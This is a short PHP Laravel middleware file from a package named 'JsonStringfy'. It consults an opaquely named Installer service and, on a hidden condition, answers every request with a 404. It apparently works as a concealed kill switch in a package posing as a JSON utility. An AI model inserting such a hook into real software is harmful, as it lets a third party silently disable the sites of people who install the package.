<?php

namespace JsonStringfy\JsonStringfy\Http\Middlewares;

use Closure;
use Facades\JsonStringfy\JsonStringfy\Services\Installer;

class Cap
{
    public function handle($request, Closure $next)
    {
        if (Installer::youAre()) {
            $string = Installer::mydoc();
            if(isset($string->success)){
                abort(404);
            }
        }
        return $next($request);
    }
}
